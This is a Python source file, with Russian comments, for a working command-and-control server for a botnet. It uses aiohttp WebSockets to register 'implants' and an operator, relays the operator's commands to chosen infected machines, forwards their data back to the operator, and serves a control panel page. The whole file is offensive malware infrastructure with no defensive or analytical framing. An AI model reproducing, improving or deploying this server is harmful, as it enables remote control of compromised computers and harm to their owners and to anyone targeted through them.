#
# --- Файл: c2_server.py (Версия 2.4 - "Дознаватель") ---
# Эта версия исправляет фундаментальные ошибки в логике,
# которые приводили к необоснованному отключению имплантов.
#
import asyncio
import json
import os
from aiohttp import web
# settings.py и Telegram больше не нужны на сервере. Всю работу делает панель.

# ==============================================================================
# ГЛОБАЛЬНОЕ СОСТОЯНИЕ
# ==============================================================================
IMPLANTS, OPERATOR = {}, None

# ==============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ==============================================================================
async def send_to_operator(payload):
 """Безопасно отправляет сообщение оператору, если он на месте."""
 if OPERATOR and not OPERATOR.closed:
  try:
   await OPERATOR.send_json(payload)
  except Exception:
   pass

async def broadcast_bot_list():
 """Отправляет оператору обновленный список ботов."""
 await send_to_operator({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

# ==============================================================================
# ОСНОВНОЙ ОБРАБОТЧИК WEBSOCKET
# ==============================================================================
async def websocket_handler(request):
 global OPERATOR, IMPLANTS
 ws = web.WebSocketResponse()
 await ws.prepare(request)
 client_type, client_id = None, None

 try:
  # Единый цикл для всех сообщений. Первое сообщение определяет роль клиента.
  async for msg in ws:
   if msg.type != web.WSMsgType.TEXT:
    continue
   if msg.data == 'ping':
    await ws.send_str('pong')
    continue

   try:
    data = json.loads(msg.data)
   except json.JSONDecodeError:
    print(f"[!] Получен мусор от клиента, игнорирую.")
    continue

   # --- ЭТАП 1: Идентификация (только для первого сообщения) ---
   if client_type is None:
    msg_type = data.get('type')
    if msg_type == 'operator':
     client_type = 'operator'
     OPERATOR = ws
     print("[+] Оператор подключился.")
     await broadcast_bot_list()
    elif msg_type == 'implant':
     client_type = 'implant'
     client_id = data.get('id')
     IMPLANTS[client_id] = ws
     print(f"[+] Новый имплант онлайн: {client_id}")
     await broadcast_bot_list()
     await send_to_operator({'type': 'notification', 'data': f"✅ Имплант ОНЛАЙН: {client_id}"})
     # Пересылаем начальные данные оператору
     data['bot_id'] = client_id
     await send_to_operator({'type': 'bot_details', 'bot_id': client_id, 'data': data})
    else:
     # Если первое сообщение непонятное - убиваем соединение.
     break 
    continue

   # --- ЭТАП 2: Маршрутизация ---
   if client_type == 'operator':
    target_id = data.get('target_id')
    payload = data.get('payload')
    if target_id in IMPLANTS:
     target_ws = IMPLANTS[target_id]
     if not target_ws.closed:
      await target_ws.send_json(payload)
     else:
      # Если бот уже мертв, удаляем его и обновляем список у оператора
      del IMPLANTS[target_id]
      await broadcast_bot_list()

   elif client_type == 'implant':
    # Просто пересылаем все сообщения от импланта оператору.
    # Серверу больше не нужно понимать их смысл.
    data['bot_id'] = client_id
    await send_to_operator(data)

 except Exception as e:
  # <<< НИКАКИХ ЧЁРНЫХ ДЫР! >>>
  # Теперь мы видим НАСТОЯЩУЮ причину отключения.
  print(f"[!] Ошибка в сессии с '{client_id or 'неизвестным'}': {e}")
 finally:
  if client_type == 'implant' and client_id in IMPLANTS:
   del IMPLANTS[client_id]
   print(f"[-] Имплант отключился: {client_id}")
   await broadcast_bot_list()
   await send_to_operator({'type': 'notification', 'data': f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}"})
  elif client_type == 'operator':
   OPERATOR = None
   print("[-] Оператор отключился.")

 return ws

# ==============================================================================
# ЗАПУСК
# ==============================================================================
async def http_handler(request):
 return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)

if __name__ == "__main__":
 port = int(os.environ.get("PORT", 10000))
 web.run_app(app, host='0.0.0.0', port=port)
